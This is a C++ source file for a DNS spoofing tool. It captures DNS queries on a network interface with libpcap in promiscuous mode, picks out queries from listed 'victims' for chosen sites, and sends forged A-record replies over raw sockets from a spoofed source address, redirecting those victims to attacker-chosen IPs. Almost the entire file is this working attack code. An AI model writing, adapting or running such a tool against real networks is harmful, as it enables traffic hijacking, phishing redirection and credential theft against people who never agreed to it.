#include "dns.hpp"
#include <sstream>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <iostream>
#include <csignal>
#include <algorithm>
#include <list>

std::string DNSQuery::to_bytes(){
    std::ostringstream oss;
    oss.write(name,strlen(name)+1);
    write_bytes_to_stream(ntohs(type), oss);
    write_bytes_to_stream(ntohs(class_), oss);
    return oss.str();
};

std::string DNSQuery::get_name() {
    if(name!=NULL) {
        ssize_t name_length = strlen(name);
        std::string _name;
        ssize_t pos=0;
        for(;pos<name_length;){
            if(pos!=0)
                _name+=".";
            _name+=std::string(name+pos+1, (uint8_t) name[pos]);
            pos+=name[pos]+1;
        }
        return _name;
    }
    return "";
}

std::string DNSResponse::to_bytes(){
    std::ostringstream oss;
    write_bytes_to_stream(ntohs(name), oss);
    write_bytes_to_stream(ntohs(type), oss);
    write_bytes_to_stream(ntohs(class_), oss);
    write_bytes_to_stream(ntohl(time_to_live), oss);
    write_bytes_to_stream(ntohs(data_length), oss);
    write_bytes_to_stream(address, oss);
    return oss.str();
}
void DNSResponse::calculate_name() {
    /*
     * https://tools.ietf.org/html/rfc1035#section-4.1.4
     * http://stackoverflow.com/questions/9865084/dns-response-answer-authoritative-section
     * 0xc00c - should cover most cases
     */
    name=0b11<<14;
    name+=0xc;
}


std::string DnsSection::to_bytes(){
    std::ostringstream oss;
    for(auto & val: {transaction_ID, flags, questions, answer_PRs, authority_PRs, additional_PRs})
        write_bytes_to_stream(ntohs(val), oss);
    for(auto & query: queries)
        oss<<query.to_bytes();
    for(auto & answer: answers)
        oss<<answer.to_bytes();
    return oss.str();
}

uint32_t bytes_to_int(const char* bytes, const ssize_t len){
    switch (len) {
        case 1:
            return (uint8_t) bytes[0];
        case 2:
            return ntohs(*(reinterpret_cast<const uint16_t *>(bytes)));
        case 4:
            return ntohl(*(reinterpret_cast<const uint32_t *>(bytes)));
    }
    throw std::invalid_argument("len is not a 1,2 or 4");
}


DnsSection parse_dns_section(const char * bytes, ssize_t len){
    DnsSection dns_section= DnsSection();

    dns_section.transaction_ID=bytes_to_int(bytes, 2);
    dns_section.flags=bytes_to_int(bytes+2, 2);
    dns_section.questions=bytes_to_int(bytes+4, 2);
    dns_section.answer_PRs=bytes_to_int(bytes+6, 2);
    dns_section.authority_PRs=bytes_to_int(bytes+8, 2);
    dns_section.additional_PRs=bytes_to_int(bytes+10, 2);
    dns_section.queries = std::vector<DNSQuery>(dns_section.questions);

    const char * question_start_pointer = bytes+12;
    for(int question_number=0; question_number<dns_section.questions; ++question_number){
        ssize_t question_length = strlen(question_start_pointer)+1;
        dns_section.queries[question_number].name=question_start_pointer;
        dns_section.queries[question_number].type=bytes_to_int(question_start_pointer + question_length, 2);
        dns_section.queries[question_number].class_=bytes_to_int(question_start_pointer + question_length + 2, 2);
        question_start_pointer= question_start_pointer+ question_length+2+2;
    }
    return dns_section;
}


uint16_t calculate_ipv4_checksum(const iphdr* ip_hdr){
    //TODO make this work both for big endian and little endian...
    const char * data= (const char* )ip_hdr;
    uint64_t sum=0;
    for(size_t val_num=0;val_num<sizeof(iphdr)/2; ++val_num){
        uint16_t val = *(reinterpret_cast<const uint16_t *>(data+val_num*2));
        sum+=htons(val);
    }
    sum-=htons(ip_hdr->check);
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}


void send_dns_response(DnsSection dns_section_response, std::string destination_ip, std::string source_ip, u_int16_t port){
    int fd;
    fd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = port;
    inet_pton(AF_INET, destination_ip.c_str(), &dest.sin_addr.s_addr);

    std::string payload = dns_section_response.to_bytes();
    auto payload_size = payload.size();
    iphdr ip_hdr;
    udphdr udp_hdr;
    ip_hdr.ihl = 5; //no Options
    ip_hdr.version = 4;
    ip_hdr.tos = 0; //DSCP
    ip_hdr.tot_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size;
    ip_hdr.id = 0;
    ip_hdr.frag_off = 0;
    ip_hdr.ttl = 255; //take max because why not
    ip_hdr.protocol = IPPROTO_UDP;
    ip_hdr.saddr = inet_addr (source_ip.c_str());
    ip_hdr.daddr = inet_addr(destination_ip.c_str());
    ip_hdr.check=calculate_ipv4_checksum(&ip_hdr);


    udp_hdr.source = htons(53);
    udp_hdr.dest = port;
    udp_hdr.len = htons(sizeof(struct udphdr) + payload_size);
    udp_hdr.check = 0; // checksum for ipv4 is optional

    std::ostringstream oss;
    oss.write(reinterpret_cast<char *>(&ip_hdr),sizeof(iphdr));
    oss.write(reinterpret_cast<char *>(&udp_hdr),sizeof(udphdr));
    oss<<payload;


    auto data = oss.str();

    if(sendto(fd,data.c_str(),data.size(),0, reinterpret_cast<sockaddr*>(&dest),sizeof(dest))==-1)
        perror("sendto error\n");
}


DnsSection construct_dns_section_response(DnsSection query, const std::string& ip){
    query.flags=0b1000000110000000;
    query.answer_PRs=query.questions;
    for(int question_no=0; question_no<query.questions; ++question_no) {
        auto dns_answer = DNSResponse();
        dns_answer.calculate_name();
        dns_answer.type=0x1; //A
        dns_answer.class_=0x1; //IN
        dns_answer.time_to_live=65;
        dns_answer.data_length=4;
        inet_pton(AF_INET, ip.c_str(), &dns_answer.address);
        query.answers.push_back(dns_answer);
    }
    return query;
}



void dns_frame_handler(u_char *arg_array, const struct pcap_pkthdr *h, const u_char *bytes){
    auto victims  = (std::vector<DNSVictim>*) arg_array;
    ssize_t ip_size = sizeof( struct ip );
    ssize_t udp_size = sizeof( struct udphdr );

//    const struct ether_header *ethernet = ( struct ether_header* ) bytes;
    const struct ip *ip_hdr = reinterpret_cast<const ip*>( bytes + ETH_HLEN );
    if(ip_hdr->ip_v==4){
        const struct udphdr *udp = reinterpret_cast<const udphdr*> (bytes + ETH_HLEN + ip_size );
        const u_char *payload = ( bytes + ETH_HLEN + ip_size + udp_size );
        for(auto victim: *victims)
            if(ip_hdr->ip_src.s_addr == inet_addr(victim.ip.c_str())){
                auto dns_frame = parse_dns_section(reinterpret_cast<const char *>(payload), udp->uh_ulen-8);
                for(auto site_to_spoof: victim.sites){
                    for(auto question: dns_frame.queries){
                        if(site_to_spoof.first == question.get_name()){
                            auto dns_response=construct_dns_section_response(dns_frame, site_to_spoof.second);
                            send_dns_response(dns_response,victim.ip,victim.spoofed_source_ip, udp->uh_sport);
                        }
                    }
                }
            }
    }
}


std::list<pcap_t*> pcap_handles;
void stop_dns_spoofing(){
    std::cout<<"stop_dns_spoofing"<<std::endl;
    while(!pcap_handles.empty()) {
        auto handle = pcap_handles.front();
        if(handle!=NULL)
            pcap_breakloop(handle);
        pcap_handles.pop_front();
    }
}
void sig_handler(int signo){
    stop_dns_spoofing();
}



void run_dns_spoof(const std::string& interface, std::vector<DNSVictim>* victims){
    bpf_u_int32 netp, maskp;
    struct bpf_program fp;

    char errbuf[PCAP_ERRBUF_SIZE];
    int64_t pcap_activate_result;


    pcap_t* handle = pcap_create(interface.c_str(), errbuf);
    if(handle==NULL)
        throw PcapError(errbuf);
    pcap_handles.push_back(handle);
    if(pcap_set_promisc(handle, 1)!=0)
        goto handle_error;
    if(pcap_set_snaplen(handle, 65535)!=0)
        goto handle_error;
    pcap_activate_result = pcap_activate(handle);
    if(pcap_activate_result>0){ //warning - continue
        pcap_perror(handle, const_cast<char*>("warning pcap_activate_result: "));
    }
    if(pcap_activate_result<0) //error - abort
        goto handle_error;

    if(pcap_lookupnet(interface.c_str(), &netp, &maskp, errbuf)==-1)
        goto handle_error;
    if(pcap_compile(handle, &fp, "port 53 and udp", 0, netp)==-1)
        goto handle_error;
    if (pcap_setfilter(handle, &fp) < 0)
        goto handle_error;
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    if(pcap_loop(handle, -1, dns_frame_handler, (u_char *)victims)==-1)
        goto handle_error;
    if(handle!=NULL)
        pcap_close(handle);
    return;

    handle_error:
        auto pcap_error = pcap_geterr(handle);
        pcap_close(handle);
        throw PcapError(pcap_error);
}
